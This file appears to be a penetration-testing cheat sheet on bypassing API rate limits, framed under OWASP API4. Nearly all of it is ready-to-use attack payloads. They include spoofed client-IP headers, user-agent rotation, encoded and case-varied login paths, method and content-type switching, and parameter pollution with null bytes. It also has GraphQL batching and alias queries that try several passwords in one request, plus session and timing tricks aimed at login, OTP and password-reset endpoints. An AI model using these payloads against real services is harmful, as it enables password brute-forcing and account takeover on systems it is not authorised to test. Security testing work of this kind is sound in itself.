# Rate Limit Bypass Techniques — API Security Testing
# OWASP API Security: API4 — Unrestricted Resource Consumption
# Severity: MEDIUM to HIGH

# ============================================================
# 1. IP-BASED BYPASS HEADERS
# ============================================================

# Rotate these headers to appear as different clients:
X-Forwarded-For: <RANDOM_IP>
X-Real-IP: <RANDOM_IP>
X-Originating-IP: <RANDOM_IP>
X-Remote-IP: <RANDOM_IP>
X-Remote-Addr: <RANDOM_IP>
X-Client-IP: <RANDOM_IP>
True-Client-IP: <RANDOM_IP>
CF-Connecting-IP: <RANDOM_IP>
X-Cluster-Client-IP: <RANDOM_IP>
Fastly-Client-IP: <RANDOM_IP>
X-Azure-ClientIP: <RANDOM_IP>
X-Azure-SocketIP: <RANDOM_IP>

# Example rotation (Burp Intruder / script):
# Request 1: X-Forwarded-For: 1.1.1.1
# Request 2: X-Forwarded-For: 1.1.1.2
# Request 3: X-Forwarded-For: 1.1.1.3
# ... continue with sequential IPs

# ============================================================
# 2. USER-AGENT ROTATION
# ============================================================

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15
User-Agent: PostmanRuntime/7.36.0
User-Agent: curl/8.4.0
User-Agent: python-requests/2.31.0
User-Agent: okhttp/4.12.0

# ============================================================
# 3. ENDPOINT VARIATION
# ============================================================

# Case variation
POST /api/v1/login
POST /API/V1/LOGIN
POST /Api/V1/Login
POST /api/V1/login
POST /api/v1/LOGIN

# Path parameter tricks
POST /api/v1/login/
POST /api/v1/login//
POST /api/v1//login
POST /api/v1/login/.
POST /api/v1/./login
POST /api/v1/login?
POST /api/v1/login#
POST /api/v1/login%20
POST /api/v1/login%00

# URL encoding
POST /api/v1/%6cogin
POST /api/v1/%6Cogin
POST /api/v1/l%6Fgin
POST /api/v1/logi%6E

# Double encoding
POST /api/v1/%256cogin

# Unicode normalization
POST /api/v1/ℓogin
POST /api/v1/logın

# API version bypass
POST /api/v2/login
POST /api/v1.1/login
POST /api/login

# ============================================================
# 4. HTTP METHOD VARIATION
# ============================================================

# If POST /login is rate-limited, try:
PUT /api/v1/login
PATCH /api/v1/login
OPTIONS /api/v1/login
HEAD /api/v1/login

# Method override
POST /api/v1/login + X-HTTP-Method-Override: GET
GET /api/v1/login + X-HTTP-Method-Override: POST

# ============================================================
# 5. CONTENT-TYPE VARIATION
# ============================================================

# Switch body format
Content-Type: application/json
{"email":"test@test.com","password":"test123"}

Content-Type: application/x-www-form-urlencoded
email=test@test.com&password=test123

Content-Type: application/xml
<auth><email>test@test.com</email><password>test123</password></auth>

Content-Type: multipart/form-data; boundary=----Boundary
------Boundary
Content-Disposition: form-data; name="email"

test@test.com
------Boundary
Content-Disposition: form-data; name="password"

test123
------Boundary--

Content-Type: text/plain
{"email":"test@test.com","password":"test123"}

# ============================================================
# 6. PARAMETER POLLUTION
# ============================================================

# Duplicate parameters (different parsers may pick different values)
POST /api/v1/login
{"email":"test@test.com","password":"test123","email":"test@test.com"}

# Array syntax
POST /api/v1/login
{"email":["test@test.com"],"password":"test123"}

# Adding junk parameters (different request hash)
POST /api/v1/login
{"email":"test@test.com","password":"test123","_":"1698765432"}

POST /api/v1/login
{"email":"test@test.com","password":"test123","timestamp":1698765433}

# Whitespace / null byte
POST /api/v1/login
{"email":"test@test.com ","password":"test123"}
{"email":"test@test.com\u0000","password":"test123"}
{"email":" test@test.com","password":"test123"}
{"email":"test@test.com\t","password":"test123"}

# ============================================================
# 7. GRAPHQL BATCHING BYPASS
# ============================================================

# Single request, multiple operations (bypasses per-request rate limit)
POST /graphql
[
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass3\") { token } }"},
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass4\") { token } }"},
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass5\") { token } }"}
]

# GraphQL aliases (same query, different aliases)
POST /graphql
{"query": "mutation { a1: login(email: \"test@test.com\", password: \"pass1\") { token } a2: login(email: \"test@test.com\", password: \"pass2\") { token } a3: login(email: \"test@test.com\", password: \"pass3\") { token } }"}

# ============================================================
# 8. COOKIE / SESSION ROTATION
# ============================================================

# Remove session cookie (each request gets a new session)
# Strip: Cookie header entirely
# Or rotate session IDs between requests

# Use different API keys if available
X-API-Key: key1
X-API-Key: key2
X-API-Key: key3

# ============================================================
# 9. TIMING / SLOWLORIS
# ============================================================

# Slow down requests to just under the rate window
# If rate limit is 100 req/min, send 99 req/min continuously
# Or send burst right after the rate window resets

# Check rate limit headers for window info:
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 0
# X-RateLimit-Reset: 1698765432
# Retry-After: 60

# ============================================================
# 10. TESTING CHECKLIST
# ============================================================

# [ ] Identify rate-limited endpoints (login, register, password reset, OTP, API calls)
# [ ] Test each IP bypass header individually
# [ ] Rotate User-Agent with each request
# [ ] Try URL encoding / case / path tricks
# [ ] Switch HTTP method
# [ ] Switch Content-Type
# [ ] Add random query parameter per request
# [ ] Test GraphQL batching / aliasing
# [ ] Remove or rotate cookies
# [ ] Monitor rate limit response headers
# [ ] Test from multiple source IPs (if available)
